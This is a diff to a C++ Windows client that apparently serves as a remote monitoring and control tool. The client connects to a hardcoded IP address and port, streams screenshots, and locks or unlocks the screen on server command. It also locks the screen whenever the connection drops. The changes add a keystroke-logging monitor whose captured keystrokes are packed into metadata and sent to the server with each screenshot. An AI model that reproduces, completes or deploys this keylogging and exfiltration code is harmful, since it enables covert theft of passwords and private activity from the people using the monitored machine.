@@ -2,39 +2,42 @@
 #include <boost/asio.hpp>
 #include <opencv2/opencv.hpp>
 #include <Windows.h>
+#include <set>
 
 #include "Header.h"
 #include "AckHeader.h"
+#include "KeyspaceMonitor.h"
 #include "ScreenLocker.h"
 
 using namespace std;
 
+ScreenLocker* lockscreen_handler = new ScreenLocker();
+KeyspaceMonitor* monitor = new KeyspaceMonitor(lockscreen_handler);
+
 const std::string kServerIpAddress = "94.194.236.180";
 const unsigned short kServerPort = 12345;
 
-bool b_locked = false;
 bool lockRequestInProgress = false;
 bool unlockRequestInProgress = false;
+
+std::array<uchar, 1024> keyStrokes{'a', 'b', 'c', 'd'};
 
 void readTextData(boost::asio::ip::tcp::socket& socket_, Header& header_);
 void sendScreenshot(boost::asio::ip::tcp::socket& socket);
 
-
-void lockScreen(ScreenLocker* lockscreen_handle, bool fromPacketHandler) {
-    if (!b_locked && !lockRequestInProgress && !unlockRequestInProgress) {
+void lockScreen(ScreenLocker* lockscreen_handle) {
+    if (!lockscreen_handler->isLocked() && !lockRequestInProgress && !unlockRequestInProgress) {
         lockRequestInProgress = true;
         lockscreen_handle->runInThread();
-        b_locked = true;
         lockRequestInProgress = false;
     }
 }
 
 void unlockScreen(ScreenLocker* lockscreen_handle) {
-    if (b_locked && !lockRequestInProgress && !unlockRequestInProgress) {
+    if (lockscreen_handler->isLocked() && !lockRequestInProgress && !unlockRequestInProgress) {
         unlockRequestInProgress = true;
         lockscreen_handle->closeWindow();
         lockscreen_handle->waitForThread();
-        b_locked = false;
         unlockRequestInProgress = false;
     }
 }
@@ -98,7 +101,7 @@ void readHeader(boost::asio::ip::tcp::socket& socket_, ScreenLocker* lockscreen_
                 readTextData(socket_, header_);
                 break;
             case LOCK_SCREEN:
-                lockScreen(lockscreen_handler, true);
+                lockScreen(lockscreen_handler);
                 break;
             case UNLOCK_SCREEN:
                 unlockScreen(lockscreen_handler);
@@ -132,7 +135,6 @@ void readTextData(boost::asio::ip::tcp::socket& socket_, Header& header_) {
     }
     catch (std::exception& ex) {
         cerr << "ERROR: MSG READ" << ex.what() << endl;
-        throw;
     }
 }
 
@@ -150,10 +152,30 @@ void sendText(boost::asio::ip::tcp::socket& socket) {
 
 void sendScreenshot(boost::asio::ip::tcp::socket& socket) {
     try {
+        MetaData metadata;
+        metadata.is_locked = lockscreen_handler->isLocked();
+        metadata.data = {};
+        std::vector<u_char> tempLog;
+
+        monitor->getLog(tempLog);
+
+        if (tempLog.size() <= metadata.data.size()) {
+            std::copy(tempLog.begin(), tempLog.end(), metadata.data.begin());
+        }
+        else {
+            std::cerr << "The array is too small to store all elements from the vector." << std::endl;
+        }
+
+        //metadata.data = keyStrokes;
+        
         std::vector<unsigned char> screenshot_data = takeScreenshot();
+
+
         Header header;
         header.type = SCREENSHOT;
         header.size = screenshot_data.size();
+        header.meta_length = sizeof(metadata);
+
         std::cout << "SCREENSHOT SIZE: " << (float)(header.size / 1000) / 1000 << "MB" << std::endl;
 
         boost::asio::write(socket, boost::asio::buffer(&header, sizeof(header)));
@@ -171,7 +193,10 @@ void sendScreenshot(boost::asio::ip::tcp::socket& socket) {
                 break;
             }
         }
-        //structure acknowledgement
+        //send metadata
+        cout << "SENDING METADATA: Locked? :" << (int)lockscreen_handler->isLocked() << ": SIZE OF: " << header.meta_length << endl;
+        boost::asio::write(socket, boost::asio::buffer(&metadata, sizeof(metadata)));
+
         Ack ack;
         boost::asio::read(socket, boost::asio::buffer(&ack, sizeof(ack)));
 
@@ -198,7 +223,6 @@ std::shared_ptr<boost::asio::ip::tcp::socket> connect_to_server(boost::asio::io_
 }
 
 int main() {
-    ScreenLocker* lockscreen_handler = new ScreenLocker();
 
     while (true) {
         try {
@@ -213,7 +237,8 @@ int main() {
         }
         catch (const std::exception& e) {
             std::cerr << "Error: " << e.what() << std::endl;
-            lockScreen(lockscreen_handler, false);
+            
+            lockScreen(lockscreen_handler);
 
             std::this_thread::sleep_for(std::chrono::seconds(5));
         }
